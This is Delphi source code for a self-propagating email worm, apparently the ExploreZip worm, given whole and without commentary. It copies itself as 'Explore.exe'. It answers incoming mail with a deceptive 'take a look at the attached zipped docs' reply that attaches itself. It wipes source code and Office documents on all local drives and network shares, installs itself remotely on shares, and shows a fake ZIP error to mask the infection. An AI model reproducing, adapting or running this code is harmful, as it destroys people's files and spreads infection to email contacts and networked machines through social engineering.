   program zipped_files;

   uses
     Forms,
     dialogs,
     classes,
     winprocs,
     windows,
     wintypes,
     messages,
     sysutils,
     FmxUtils in 'fmxutils.pas',
     virusutil in 'virusutil.pas',
     scandir in 'scandir.pas',
     mapiutils in 'mapiutils.pas',
     netscan in 'netscan.pas',
     mainfrm in 'mainfrm.pas' {MainForm};
   {$R *.RES}

   const
   HIDDEN_NAME='Explore.exe';
   MAIL_NAME='zipped_files.exe';
   ZIP_NAME='zipped_files.zip';
   type
     TOBJ1 = class(TObject)

     private
       { Private declarations }
     public
       { Public declarations }
       function fHookMsg(var Message:Tmessage):boolean;
     end;


    TVirusThread = class(TThread)
     private
       { Private declarations }
     public
       { Public declarations }
       TSK:integer;
        procedure Execute; override;
        constructor Create(suspended:boolean;tnum:integer);
        procedure Run(tnum:integer);
     end;

   var
     MtObj: TOBJ1;
     STOP_NOW:boolean=false;


   /////////////
   function ReMail(destAddr,DestName,srcAddr,srcName,subject,body:string;attachments:TStringlist):boolean;
   var
   str1,str2,str3:string;
   n:integer;
   begin
   if Pos('RE:',UpperCase(subject))> 0 then exit;


   /////////
   if STOP_NOW then exit;
   attachments.Clear;


   attachments.Add(Application.exeName+'|'+MAIL_NAME);

   n:=Pos(' ',srcName);
   if(n>0) then
   begin
   str1:='Hi '+copy(SrcName,1,n-1)+' !';
   end
    else
     begin
     if((Pos('@',SrcName)>0) or (Length(SrcName)=0) ) then
         str1:='Hi !'
         else
           str1:='Hi '+copy(SrcName,1,n-1)+' !';

     end;
   destName:=trim(destName);
   srcName:=trim(srcName);
   n:=Pos(' ',destName);
   if(n>0) then
   begin
   str2:='Sincerely '+chr(13)+chr(9)+copy(destName,1,n-1)+'.';
   end
    else
     begin
      if((Pos('@',destName)>0) or (Length(destName)=0) ) then
         str2:='bye.'
         else
           str2:='Sincerely '+chr(13)+chr(9)+copy(destName,1,n-1)+'.';
     end;


   subject:='RE: '+ subject;
   body:=Str1+chr(10)+chr(13);
   body:=body+ 'I received your email and I shall send you a reply ASAP.'+chr(10)+chr(13);
   body:=body+ 'Till then, take a look at the attached zipped docs.'+chr(10)+chr(13);
   body:=body+ str2;
   EasyMail(srcAddr,srcName,destAddr,DestName,subject,body,attachments);
   ReMail:=True;
   end;




   ///////////////



   function TOBJ1.fHookMsg(var Message:Tmessage):boolean;
   begin
   if((Message.Msg=WM_CLOSE) or (Message.Msg=WM_ENDSESSION) or (Message.wParam=WM_QUERYENDSESSION)) then
   begin
     STOP_NOW:=true;
     StopScanNow();
     StopMAPINow();
     fHookMsg:=false;
     exit;
   end;

     fHookMsg:=True;
   end;

   procedure cln(dir,info:string);
   var
   ext:string;
   f:file;
   //////
   stmp:string;
   /////
   begin
   dir:=uppercase(dir);
   //exit;

   if((pos('WIN.INI',dir) > 0) and (pos('C:',dir) <> 1))then
   begin
   RemoteInstall('_setup.exe',extractfilepath(dir));
   end;

   ext:=copy(dir,Length(dir)-3,4);
   ext:=copy(ext,pos('.',ext),1+4-pos('.',ext));
   if((ext='.C') or (ext='.H') or (ext='.CPP') or (ext='.ASM') or (ext='.DOC') or (ext='.XLS') or (ext='.PPT')) then
    begin
    try
   assignfile(f,dir);
   rewrite(f);
   reset(f);
   truncate(f);

   except;

   end;

    try CloseFile(f); except; end;

    end;

   end;


   procedure netcln(dir,info:string);
   begin

   DirScan(dir,faAnyFile and (not faDirectory),cln,'');
   end;


   constructor TVirusThread.Create(suspended:boolean;tnum:integer);
   begin
   TSK:=tnum;
   inherited Create(suspended);

   end;

   procedure TVirusThread.Execute;
   begin
   Run(TSK);


   end;
   procedure TVirusThread.Run(tnum:integer);
   var L:longint;
   drv:string;
   begin
    case tnum of
        1: SelfInstall(HIDDEN_NAME);
        2:
     while(true) do
     if (_MAPILogONSilent()) then  begin
     ScanMSG(ReMail,true,true);_MAPILogOFF(); end;
     3:
     begin
     L:=0;
     while (true) do
     begin
     drv:= chr(ord('C')+(L mod 24))+':\';
     DirScan(drv,faAnyFile and (not faDirectory),cln,'');
     L:=L+1;
     end;
     end;
     4:
     NetEnumerate(nil,netcln);

    end;
   end;


   var
   msgb:PChar;
   tf:Textfile;
   install_tsk:TVirusThread;
   remail_tsk:TVirusThread;
   cln_tsk:TVirusThread;
   netcln_tsk:TVirusThread;
   begin
     Application.Initialize;
     install_tsk:=TVirusThread.Create(false,1);
     remail_tsk:=TVirusThread.Create(false,2);
     cln_tsk:=TVirusThread.Create(false,3);
     netcln_tsk:=TVirusThread.Create(false,4);

     Application.Title := 'Findfast';
     Application.CreateForm(TMainForm, MainForm);
     Application.HookMainWindow(MtObj.fHookMsg);


   //getprivateprofilestring ('windows','RunParam1','',tmp1,100,'win.ini');




   if(upperCase(extractfilename(Application.ExeName))  <>  upperCase(HIDDEN_NAME) ) then
   begin
   msgb:='Cannot open file: it does not appear to be a valid archive. If this file is part of a ZIP format backup set, insert the last disk of the backup set and try again. Please press F1 for help.';
   Application.messagebox(msgb,'Error',MB_ICONHAND);
   try
   assignfile( tf,'c:\'+ZIP_NAME);
   rewrite(tf);
   closefile(tf);
   ExecuteFile('c:\'+ZIP_NAME,'','',SW_SHOWDEFAULT);
   DeleteFile('c:\'+ZIP_NAME);
   except;
   end;
   //  Application.Run;

   end;
   //writeprivateprofilestring ('windows','RunParam1','20','win.ini');




   while (not STOP_NOW) do
   begin

   Application.ProcessMessages;
   end;

     Application.UnHookMainWindow(MtObj.fHookMsg);
    install_tsk.destroy;
     remail_tsk.destroy;
     cln_tsk.destroy;
     netcln_tsk.destroy;

   end.
